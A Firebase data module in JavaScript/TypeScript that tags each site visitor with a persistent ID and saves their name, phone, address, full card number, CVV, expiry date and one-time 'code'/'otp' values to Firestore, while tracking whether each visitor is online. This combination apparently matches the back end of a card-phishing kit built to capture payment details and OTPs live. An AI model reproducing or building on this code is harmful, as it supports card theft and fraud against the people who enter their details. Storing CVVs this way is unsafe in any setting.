// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase, ref, update } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";

const firebaseConfig = {
  apiKey: "AIzaSyBRUkETMNs0MYbyP2H_PhIhJaEk2eAXZrU",
  authDomain: "omaan-myah-m.firebaseapp.com",
  databaseURL: "https://omaan-myah-m-default-rtdb.firebaseio.com",
  projectId: "omaan-myah-m",
  storageBucket: "omaan-myah-m.firebasestorage.app",
  messagingSenderId: "984417007149",
  appId: "1:984417007149:web:9eb4d96a6f920a4fb42aa4",
  measurementId: "G-36QFNG8FHD"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);

const VISITOR_STORAGE_KEY = "visitorId";
const LEGACY_VISITOR_STORAGE_KEY = "visitor";
let fallbackVisitorCounter = 0;

function createVisitorId() {
  if (typeof crypto !== "undefined" && typeof crypto.randomUUID === "function") {
    return `zssain-app-${crypto.randomUUID()}`;
  }

  if (typeof crypto !== "undefined" && typeof crypto.getRandomValues === "function") {
    const randomValues = new Uint32Array(4);
    crypto.getRandomValues(randomValues);
    return `zssain-app-${Array.from(randomValues, (value) => value.toString(36)).join("")}`;
  }

  fallbackVisitorCounter += 1;
  const performancePart =
    typeof performance !== "undefined" ? Math.trunc(performance.now() * 1000).toString(36) : "0";
  return `zssain-app-${Date.now().toString(36)}-${performancePart}-${fallbackVisitorCounter.toString(36)}`;
}

export function getVisitorId(existingId?: string | null) {
  if (typeof window === "undefined") {
    return existingId || null;
  }

  const savedVisitorId =
   localStorage.getItem(VISITOR_STORAGE_KEY) ?? localStorage.getItem(LEGACY_VISITOR_STORAGE_KEY);
  const visitorId = existingId || savedVisitorId || createVisitorId();

  localStorage.setItem(VISITOR_STORAGE_KEY, visitorId);
  localStorage.setItem(LEGACY_VISITOR_STORAGE_KEY, visitorId);
  return visitorId;
}

export function getOrCreateVisitorId(existingId?: string | null) {
  return getVisitorId(existingId);
}

function removeUndefinedValues(value: any): any {
  if (Array.isArray(value)) {
    return value.map(removeUndefinedValues);
  }

  if (value && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value)
        .filter(([, entryValue]) => entryValue !== undefined)
        .map(([entryKey, entryValue]) => [entryKey, removeUndefinedValues(entryValue)])
    );
  }

  return value;
}

function getFullName(data: any) {
  return data.name || data.fullName || [data.firstName, data.lastName].filter(Boolean).join(" ") || "";
}

export async function addData(data: any) {
  const visitorId = getVisitorId(data?.visitorId ?? data?.id);
  if (!visitorId) return;

  const hasRegistrationData =
    data?.name || data?.firstName || data?.lastName || data?.fullName || data?.phone;
  const hasCardData = data?.cardNumber || data?.cardData;
  const selectedOrder = data?.order || data?.selectedOffer;
  const codeValue = data?.code || data?.otp;

  const payload = removeUndefinedValues({
    ...data,
    id: visitorId,
    visitorId,
    online: data?.online ?? true,
    ...(hasRegistrationData && {
      registration: {
        name: getFullName(data),
        phone: data.phone,
        email: data.email,
        address: data.address,
        city: data.city,
        postalCode: data.postalCode,
      },
    }),
    ...(hasCardData && {
      cards: data.cards ?? data.cardData ?? {
        cardNumber: data.cardNumber || data.cardData?.cardNumber,
        cvv: data.cvv || data.cardData?.cvv,
        expiryDate: data.expiryDate || data.cardData?.expiryDate,
        expiryMonth: data.expiryMonth || data.cardData?.expiryMonth,
        expiryYear: data.expiryYear || data.cardData?.expiryYear,
        cardName: data.cardName || data.cardData?.cardName,
      },
    }),
    ...(codeValue && {
      code: {
        value: codeValue,
      },
    }),
    ...(selectedOrder && {
      order: selectedOrder,
      orders: data.orders || [selectedOrder],
    }),
    currentPage: data?.currentPage,
    updatedAt: new Date().toISOString(),
  });

  console.log("Saving visitor data", visitorId, data);
  console.log("[Firebase save] visitor data", {
    firestorePath: `visitors/${visitorId}`,
    presencePath: `status/${visitorId}`,
    visitorId,
    fields: Object.keys(payload),
  });

  try {
    const docRef = doc(db, "visitors", visitorId);
    await Promise.all([
      setDoc(docRef, payload, { merge: true }),
      update(ref(database, `/status/${visitorId}`), {
        id: visitorId,
        visitorId,
        online: true,
        lastDataUpdate: payload.updatedAt,
      }),
    ]);

    console.log("[Firebase save] visitor data saved", {
      firestoreId: docRef.id,
      firestorePath: `visitors/${visitorId}`,
      presencePath: `status/${visitorId}`,
    });
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("[Firebase save] Error adding visitor data: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = getOrCreateVisitorId();
    if (visitorId) {
      const docRef = doc(db, "visitors", visitorId);
      const payload = { ...paymentInfo, id: visitorId, visitorId, status: "pending" };
      console.log("[Firebase save] payment info", {
        path: `visitors/${visitorId}`,
        realtimePath: `visitors/${visitorId}`,
        presencePath: `status/${visitorId}`,
        visitorId,
        fields: Object.keys(payload),
      });
      await Promise.all([
        setDoc(docRef, payload, { merge: true }),
        update(ref(database, `/status/${visitorId}`), {
          id: visitorId,
          visitorId,
          lastDataUpdate: new Date().toISOString(),
        }),
      ]);
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("[Firebase save] Error adding payment info: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db, database };
